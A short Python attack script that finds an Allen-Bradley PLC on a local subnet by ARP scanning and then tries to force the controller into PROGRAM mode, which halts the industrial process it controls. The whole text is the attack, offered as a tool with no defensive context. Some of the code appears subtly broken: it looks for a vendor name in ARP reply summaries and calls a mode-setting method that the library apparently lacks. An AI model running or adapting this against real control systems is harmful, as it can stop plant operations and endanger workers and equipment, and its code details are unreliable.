import socket
import sys
import struct
from pycomm3 import LogixDriver
from scapy.all import ARP, Ether, srp

# Step 1: Discover PLC's IP address via network scanning
def find_plc_ip(network_range="192.168.1.0/24"):
    print("[*] Scanning network to find PLC...")

    # Create an ARP request to detect active devices on the subnet
    arp_request = ARP(pdst=network_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    request = broadcast / arp_request
    answered, _ = srp(request, timeout=2, verbose=False)

    plc_ip = None
    for sent, received in answered:
        if "Rockwell" in received.summary():  # Rockwell Automation is the vendor for Allen-Bradley PLCs
            plc_ip = received.psrc
            print(f"[+] PLC found at IP: {plc_ip}")
            break

    if not plc_ip:
        print("[-] No PLC found. Exiting...")
        sys.exit(1)

    return plc_ip

# Step 2: Change the PLC's mode to "Program"
def change_plc_mode(plc_ip, mode="PROGRAM"):
    modes = {
        "PROGRAM": 0x01,
        "RUN": 0x02,
        "TEST": 0x03
    }

    if mode not in modes:
        print(f"[-] Invalid mode: {mode}. Use PROGRAM, RUN, or TEST.")
        sys.exit(1)

    print(f"[*] Connecting to PLC at {plc_ip} to change mode to '{mode}'...")
    
    try:
        with LogixDriver(plc_ip) as plc:
            response = plc.set_plc_mode(modes[mode])
            if response:
                print(f"[+] Successfully changed PLC mode to {mode}.")
            else:
                print("[-] Failed to change PLC mode.")
    except Exception as e:
        print(f"[!] Error communicating with PLC: {e}")

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()  # Step 1: Discover PLC IP
    change_plc_mode(plc_ip, mode="PROGRAM")  # Step 2: Change mode to PROGRAM